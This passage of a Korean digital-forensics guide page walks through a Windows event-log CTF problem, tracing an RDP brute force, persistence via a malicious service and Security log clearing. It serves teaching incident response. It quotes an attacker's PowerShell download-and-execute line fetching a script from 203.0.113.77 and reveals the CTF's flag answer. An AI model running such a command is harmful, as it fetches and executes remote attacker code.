+$csv | Where-Object { $_.Channel -eq &#39;Security&#39; } |
+  Sort-Object { [int64]$_.EventRecordId } | Select-Object -Last 3 EventRecordId, TimeCreated, EventId
+
+# 5) 감사 정책이 중간에 바뀌었는가
+$csv | Where-Object { $_.EventId -in 4719,1100,104 } |
+  Select-Object TimeCreated, Channel, EventId, UserName, MapDescription</code></pre></div>
+<p>4번에서 1102가 마지막 레코드면 은폐가 성공한 것이고, 1102 뒤에도 이벤트가 있으면 <strong>지워진 것은 그 이전 구간</strong>이다. 이 구분이 서술을 바꾼다.</p>
+<h2 id="mini-walkthrough">mini walkthrough</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;이 호스트에서 일어난 침해를 시간순으로 서술하고,
+ 공격자가 심은 지속성 수단의 이름을 flag 로 제출하세요.
+ 지문: &#39;침해는 2026-03-14 오후(KST)에 일어났습니다.&#39;
+ 첨부: winevt/ (Security, System, PowerShell/Operational, Sysmon)&quot;
+
+1. 라운드 1
+   EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf all.csv
+   -&gt; 1,384,902 행 (Sysmon 이 대부분)
+
+2. 첫 시도 (실패):
+   지문의 &quot;오후&quot;를 그대로 믿고 13:00~18:00 으로 필터했다.
+
+   $csv | Where-Object {
+     ([datetime]$_.TimeCreated) -ge [datetime]&#39;2026-03-14T13:00:00&#39; -and
+     ([datetime]$_.TimeCreated) -le [datetime]&#39;2026-03-14T18:00:00&#39;
+   }
+   -&gt; 4,102 행. 그런데 4625 폭주도, 7045 도 하나도 안 보인다.
+
+   무엇이 틀렸나:
+     EVTX 의 시각은 UTC 다. 지문의 오후는 KST 다.
+     KST 13:00~18:00 = UTC 04:00~09:00 이다.
+     UTC 13~18시로 필터했으니 실제로는 KST 22시~다음날 03시를 보고 있었다.
+
+   =&gt; 필터 구간을 UTC 04:00~09:00 으로 고쳤다.
+
+3. 골격 확보
+   $csv | Where-Object { $_.EventId -in 4625,4624,4688,7045,1102 -and (UTC 04~09) }
+
+   4625 : 07:11:02Z ~ 07:18:39Z 사이 214건, 전부 IpAddress=203.0.113.77,
+          TargetUserName=svc_backup
+   4624 : 07:19:02Z svc_backup Type 10 (RDP), LogonId 0x1a2b3c
+   7045 : 07:28:33Z 존재
+   1102 : 07:45:11Z 존재
+
+   골격 완성. 초기 접근 = RDP 무차별 대입 성공.
+
+4. 두 번째 시도 (실패):
+   실행 단계를 4688 의 CommandLine 으로 보려 했다.
+
+   $csv | Where-Object { $_.EventId -eq 4688 } |
+     Select-Object TimeCreated, Payload | Format-List
+   -&gt; CommandLine 필드가 전부 비어 있다.
+
+   &quot;명령행 없이 실행됐다&quot; 로 서술? 오답.
+
+   무엇이 틀렸나:
+     4688 의 CommandLine 은 별도 정책을 켜야 채워진다.
+     이 호스트는 그 정책이 꺼져 있어 필드 자체가 비었다.
+     &quot;인자 없이 실행&quot;이 아니라 &quot;기록되지 않음&quot;이다.
+
+   우회:
+     PowerShell/Operational 4103 의 ContextInfo -&gt; Host Application 에
+     전체 명령행이 남아 있다.
+     4104 의 ScriptBlockText 에 스크립트 본문이 남아 있다.
+     Sysmon 1 의 CommandLine 도 채워져 있다.
+
+   -&gt; 07:20:08Z powershell.exe -enc SQBFAFgA... (Sysmon 1)
+      07:20:09Z 4104: IEX (New-Object Net.WebClient).DownloadString(&#39;http://203.0.113.77/a.ps1&#39;)
+
+5. 세 번째 시도 (실패):
+   지속성 수단으로 7045 를 봤는데 그 구간에 7045 가 두 개 있었다.
+
+   07:28:33Z  ServiceName=WinUpdateSvc   ImagePath=C:\Users\Public\svc.exe
+   07:29:04Z  ServiceName=NVDisplayCont  ImagePath=C:\Program Files\NVIDIA...
+
+   시각순으로 앞의 것을 골랐는데, 두 개가 같은 초가 아니라 순서는 맞았다.
+   그런데 &quot;정상 소프트웨어 설치일 수도 있다&quot;는 확증을 하지 않고
+   NVDisplayCont 를 flag 로 낼 위험이 있었다.
+
+   확증 절차:
+     - ImagePath 가 사용자 쓰기 가능 경로(C:\Users\Public)인가 -&gt; WinUpdateSvc: 예
+     - 그 파일이 사건 구간에 생성됐는가 -&gt; Sysmon 11 에 07:27:51Z TargetFilename=C:\Users\Public\svc.exe
+     - 설치한 세션이 공격자 세션인가 -&gt; 같은 시각 4688/Sysmon 1 의 부모가 0x1a2b3c 세션
+     - NVDisplayCont 의 ImagePath 는 C:\Program Files\NVIDIA... -&gt; 정상 경로, 서명된 벤더 경로
+
+   -&gt; 지속성 수단은 WinUpdateSvc 로 확정.
+
+6. 은폐 판정
+   1102 : 07:45:11Z, RecordId 1185204
+   Security 채널의 마지막 레코드 번호와 같다 -&gt; 이후 구간 전부 소실.
+   Sysmon 채널은 08:30 까지 계속 기록되어 있다.
+   =&gt; Security 만 지운 것이다. 시스템이 꺼진 것이 아니다.
+
+7. 최종 타임라인 (KST 병기)
+   16:11:02 (07:11:02Z) 4625 x214  203.0.113.77 -&gt; svc_backup 무차별 대입
+   16:19:02 (07:19:02Z) 4624 Type 10 성공, LogonId 0x1a2b3c
+   16:19:02 (07:19:02Z) 4672 SeDebugPrivilege 포함 특수 권한
+   16:20:08 (07:20:08Z) Sysmon 1 powershell.exe -enc ...
+   16:20:09 (07:20:09Z) 4104 DownloadString(&#39;http://203.0.113.77/a.ps1&#39;)
+   16:27:51 (07:27:51Z) Sysmon 11 C:\Users\Public\svc.exe 생성
+   16:28:33 (07:28:33Z) 7045 WinUpdateSvc 서비스 설치 (지속성)
+   16:31:44 (07:31:44Z) 5145 C$ Users\Public\out.7z 접근
+   16:45:11 (07:45:11Z) 1102 감사 로그 지움 (Security 마지막 레코드)
+
+정답 flag: WinUpdateSvc</code></pre></div>
+<p>세 번의 교정이 이 글의 핵심이다. <strong>① 지문의 KST를 UTC로 환산하지 않으면 존재하지 않는 구간을 뒤진다.</strong> <strong>② <code>CommandLine</code> 이 비어 있는 것은 &quot;인자 없음&quot;이 아니라 &quot;기록 안 됨&quot;이다</strong> — 4103/4104/Sysmon 1로 우회한다. <strong>③ 7045가 여러 개면 <code>ImagePath</code> 의 경로와 그 파일의 생성 흔적으로 정상/악성을 갈라야</strong> 답이 확정된다.</p>
+<h2 id="막혔을-때-다음-체크">막혔을 때 다음 체크</h2>
+<ol><li>지문의 시각이 KST인가 — 필터는 UTC(−9시간)로 환산했는가</li><li>라운드 1의 5종(4624/4625/4688/7045/1102)으로 골격을 만들었는가</li><li>노이즈(컴퓨터 계정, <code>0x3e7</code>)를 제거했는가</li><li>4625 집계로 공격 시작 시각을 확정했는가</li><li>4624의 <code>TargetLogonId</code> 로 세션 활동을 조인했는가 (FOR-0104)</li><li><code>CommandLine</code> 이 비어 있으면 4103/4104/Sysmon 1로 우회했는가</li><li>7045/4697의 <code>ImagePath</code> 가 정상 경로인지 확인했는가</li><li>4698(작업 등록)과 Sysmon 13(Run 키)도 봤는가</li><li>1102/104가 마지막 레코드인지 확인했는가</li><li>다른 채널이 그 구간에 계속 기록되어 있는지 대비했는가</li><li>같은 초 순서를 채널 내 <code>EventRecordId</code> 로 정렬했는가</li><li>각 단계의 확증 조건을 만족했는가 (5단계 표)</li><li>표와 서술 문장을 <strong>둘 다</strong> 만들었는가</li><li>문장마다 Event ID와 <code>RecordId</code> 근거를 붙였는가</li><li>관측되지 않은 단계를 &quot;일어나지 않음&quot;으로 쓰지 않았는가</li></ol>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-022 — Microsoft Learn, 고급 보안 감사 정책 설정: 4624·4625·4634·4648·4672·4673·4674·4697·4698·4719·4720·4732·4776·4768·4769·5140·5145·1100·1102 의 정의와 각 감사 하위 범주, 어떤 하위 범주가 기본으로 비활성인지의 근거</li><li>SRC-086 — MITRE ATT&amp;CK Enterprise Techniques: 초기 접근·실행·지속성·권한 상승·자격증명 접근·측면 이동·수집/반출·방어 회피 단계 구분과 각 단계의 대표 기법</li><li>SRC-021 — Microsoft Learn, Event 4688: <code>NewProcessName</code>, <code>CommandLine</code>, <code>SubjectLogonId</code> 필드와 명령행 기록이 별도 정책이라는 근거</li><li>Sysmon 이벤트(1/3/11/13/23)의 필드 이름은 Sysmon 문서 기준이며, 설정 파일(config)에 따라 수집 여부가 달라진다. 실제 채널에서 존재를 확인한 뒤 인용할 것</li><li>7045(Service Control Manager)와 104(Eventlog)는 System 채널의 이벤트로, 각 공급자 문서의 정식 필드 이름은 실제 이벤트 XML에서 확인할 것</li><li>각 감사 하위 범주의 기본 활성/비활성 상태는 Windows 버전과 적용된 정책에 따라 다르므로, &quot;기본으로 꺼져 있다&quot;를 근거로 쓸 때는 4719(감사 정책 변경)와 대상 시스템의 실제 정책을 함께 확인할 것</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./ntfs-artifact-timeline.html">
+    <span class="rel-id">FOR-0050 · 디스크/NTFS</span>
+    NTFS artifact 종합 타임라인 만들기: $MFT·$J·EVTX·Prefetch를 한 축에
+  </a>
+  <a class="related-item" href="./merge-evtx-csv.html">
+    <span class="rel-id">FOR-0107 · Event Log</span>
+    여러 EVTX를 하나의 CSV로 합치기: 채널 통합·컬럼 정규화·sqlite 조인
+  </a>
+  <a class="related-item" href="./windows-log-ctf-walkthrough.html">
+    <span class="rel-id">FOR-0110 · Event Log</span>
+    Windows 로그 종합 CTF 풀이: RDP 침입부터 로그 삭제까지 4채널 추적
+  </a>
+  <a class="related-item" href="./event-4624-logon.html">
+    <span class="rel-id">FOR-0083 · Event Log</span>
+    Event ID 4624 성공 로그온 분석: 누가 어디서 어떻게 들어왔나
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./merge-evtx-csv.html"><span class="rel-id">← FOR-0107</span>여러 EVTX를 하나의 CSV로 합치기: 채널 통합·컬럼 정규화·sqlite 조인</a>
+<a class="related-item" href="./no-event-crosscheck.html"><span class="rel-id">FOR-0109 →</span>있어야 할 이벤트가 없을 때: 원인 8가지 판별과 대체 artifact 매핑</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#어떤-문제에서-필요한가">어떤 문제에서 필요한가</a></li>
+<li class="toc-l2"><a href="#문제에서-처음-볼-단서">문제에서 처음 볼 단서</a></li>
+<li class="toc-l2"><a href="#30초-절차">30초 절차</a></li>
+<li class="toc-l2"><a href="#상세-절차">상세 절차</a></li>
+<li class="toc-l3"><a href="#1단계-침해-단계별-event-id-지도">1단계 — 침해 단계별 Event ID 지도</a></li>
+<li class="toc-l3"><a href="#2단계-최소-필요-이벤트로-시작한다">2단계 — 최소 필요 이벤트로 시작한다</a></li>
+<li class="toc-l3"><a href="#3단계-값을-다음-단계-필터로-넘기는-흐름">3단계 — 값을 다음 단계 필터로 넘기는 흐름</a></li>
+<li class="toc-l3"><a href="#4단계-노이즈-제거">4단계 — 노이즈 제거</a></li>
+<li class="toc-l3"><a href="#5단계-단계별로-하나씩-확정">5단계 — 단계별로 하나씩 확정</a></li>
+<li class="toc-l3"><a href="#6단계-결과를-시간순-표로-정리">6단계 — 결과를 시간순 표로 정리</a></li>
+<li class="toc-l3"><a href="#7단계-시간대-처리">7단계 — 시간대 처리</a></li>
+<li class="toc-l2"><a href="#출력-필드-해석">출력 필드 해석</a></li>
+<li class="toc-l2"><a href="#pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-함정">흔한 함정</a></li>
+<li class="toc-l2"><a href="#교차검증">교차검증</a></li>
+<li class="toc-l2"><a href="#mini-walkthrough">mini walkthrough</a></li>
+<li class="toc-l2"><a href="#막혔을-때-다음-체크">막혔을 때 다음 체크</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
